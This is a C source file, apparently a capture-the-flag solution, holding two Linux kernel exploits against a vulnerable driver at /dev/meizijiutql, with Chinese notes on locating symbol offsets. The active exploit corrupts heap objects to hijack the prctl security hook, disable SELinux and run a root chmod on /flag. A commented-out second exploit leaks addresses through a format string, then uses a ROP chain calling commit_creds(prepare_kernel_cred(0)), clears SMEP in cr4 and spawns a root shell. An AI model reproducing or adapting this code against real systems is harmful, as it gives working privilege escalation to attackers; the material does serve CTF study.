/*
查找函数偏移：
    cat /proc/kallsym | grep <func_name>
查找全局变量偏移：
task_prctl_hook:
    先查security_task_prctl函数地址，下断点，调用prctl，断下后看汇编指令前十几行会有test r15,r15，应该就是检查hook，此时就找到task_prctl_hook的函数地址
sbin_poweroff:
    IDA sbin/poweroff
*/
//exp.c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <errno.h>
#include <sys/stat.h>
#include <sys/ioctl.h>
#include <fcntl.h>
#include <string.h>
#include <pty.h>
#include <sys/mman.h>
#include <sys/ipc.h>
#include <sys/sem.h>

#define to_kmalloc 0x73311337
#define to_kfree 0x13377331
#define to_show 0xdeadbeef

int main(int argc, char const *argv[])
{
    unsigned long kernel_base;
    puts("input kernel addr:");
    scanf("%p",&kernel_base);
    kernel_base -= 0x1c827f;
    unsigned long set_memory_rw = kernel_base + 0x54870;
    unsigned long selinux_disable = kernel_base + 0x31ebc0;
    unsigned long sbin_poweroff = kernel_base + 0x1241d40;
    unsigned long security_task_prctl = kernel_base + 0x3134e0;
    unsigned long hook_addr = kernel_base + 0x12934a8;
    unsigned long orderly_poweroff = kernel_base + 0x81b10;
    unsigned long poweroff_work_func = kernel_base + 0x82000;

    printf("kernel_base = %p\n", kernel_base);
    printf("set_memory_rw = %p\n", set_memory_rw);
    printf("selinux_disable = %p\n", selinux_disable);
    printf("sbin_poweroff = %p\n", sbin_poweroff);
    printf("security_task_prctl = %p\n", security_task_prctl);
    printf("hook_addr = %p\n", hook_addr);
    printf("orderly_poweroff = %p\n", orderly_poweroff);
    printf("poweroff_work_func = %p\n", poweroff_work_func);
    printf("stop here\n");scanf("%p",&kernel_base);
    int fd1 = open("/dev/meizijiutql", O_RDWR);
    
    ioctl(fd1,to_kmalloc,0xc0);

    unsigned long fake[0x19] = {0};
    fake[0x18] = sbin_poweroff;
    write(fd1,(char *)fake,sizeof(fake));

    ioctl(fd1,to_kmalloc,0xc0);
    ioctl(fd1,to_kmalloc,0xc0);//get addr

    char cmd[] = "/bin/chmod 777 /flag";
    //char cmd[] = "whoami";
    write(fd1,cmd,sizeof(cmd));

    ioctl(fd1,to_kmalloc,0x100);
    unsigned long fake2[0x21] = {0};
    fake2[0x20] = hook_addr;
    write(fd1,(char *)fake2,sizeof(fake2));

    ioctl(fd1,to_kmalloc,0x100);
    ioctl(fd1,to_kmalloc,0x100);//get addr

    unsigned long addr = sbin_poweroff;
    //unsigned long addr = cmd;
    unsigned long fake_table[4] = {0};
    fake_table[3] = selinux_disable;

    unsigned long *p = &fake_table;
    write(fd1,&p,8);
    //prctl(addr,2,addr,addr,2);//do selinux_disable
    printf("do selinux_disable\n");
    fake_table[3] = poweroff_work_func;
    //fake_table[3] = orderly_poweroff;
    prctl(addr,2,addr,addr,2);//do poweroff_work_func
    return 0;
}

/*
// musl-gcc -static exploit.c -o a.out
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <pthread.h>
#include <sys/stat.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <memory.h>
#include <pty.h>
#include <signal.h>

void s()
{
    puts("Paused (press any to continue)");
    getchar();
}

void shell()
{
    system("/bin/sh");
    exit(0);
}

unsigned long long user_cs, user_ss, user_eflags, user_sp;
void save_status()
{
    asm(
        "movq %%cs, %0\n"
        "movq %%ss, %1\n"
        "movq %%rsp, %3\n"
        "pushfq\n"
        "popq %2\n"
        : "=r"(user_cs), "=r"(user_ss), "=r"(user_eflags), "=r"(user_sp));
}

int main()
{
    int fd, i;
    unsigned long long kernel_addr, stack_addr, *rop, offset;
    char buf[0x2000];

    setbuf(stdout, NULL);
    save_status();
    signal(SIGSEGV, shell);

    if ((fd = open("/dev/meizijiutql", O_RDWR)) == -1)
    {
        fprintf(stderr, "open error: %m\n");
        exit(1);
    }

    ioctl(fd, 0x73311337, 0xff0); // kmalloc

    write(fd, "%llx %llx %llx %llx %llx kernel: 0x%llx %llx %llx %llx stack: 0x%llx %llx %llx %llx %llx\n", 90);//fmt leak
    // s();
    ioctl(fd, 0xDEADBEEF, 0); // printk
    printf("Input kernel: ");
    scanf("%p", (char **)&kernel_addr);
    kernel_addr -= 0x1c827f;
    offset = kernel_addr - 0xFFFFFFFF81000000;
    printf("kernel_addr: 0x%llx\n\n", kernel_addr);

    printf("Input stack: ");
    scanf("%p", (char **)&stack_addr);
    getchar();
    stack_addr &= 0xfffffffffffff000;
    printf("stack_addr: 0x%llx\n\n", stack_addr);

    for (i = 0; i < 0x140; i++)
    {
        ioctl(fd, 0x73311337, 0xff0);
    }

#define PADDING 0xf00

    for (i = 0; i + stack_addr < stack_addr + PADDING; i += 8)
    {
        *(unsigned long long *)(buf + i) = offset + 0xffffffff810001cc; // ret
    }
    *(unsigned long long *)(buf + 0x1000) = stack_addr;
    write(fd, buf, 0x1008);

    ioctl(fd, 0x73311337, 0xff0);
    ioctl(fd, 0x73311337, 0xff0);

    rop = (unsigned long long *)(buf + PADDING);
    *rop++ = offset + 0xffffffff810460e0; // xor edi, edi; ret;
    *rop++ = offset + 0xffffffff81081790; // prepare_kernel_cred
    *rop++ = offset + 0xffffffff819e2959; // mov rdi, rax; mov qword ptr [rdi], 1; ret;
    *rop++ = offset + 0xffffffff81081410; // commit_creds

    *rop++ = offset + 0xffffffff8101ac0c; // pop rax; ret;
    *rop++ = 0x6f0;
    *rop++ = offset + 0xffffffff810035b5; // mov cr4, rax; push rcx; popfq; ret;

    *rop++ = offset + 0xffffffff81a00d5a; // swapgs; popfq; ret;
    *rop++ = 0;
    *rop++ = offset + 0xffffffff81021762; // iretq; ret;

    *rop++ = (unsigned long long)shell;
    *rop++ = user_cs;
    *rop++ = user_eflags;
    *rop++ = user_sp;
    *rop++ = user_ss;

    write(fd, buf, 0x1000);
}
*/
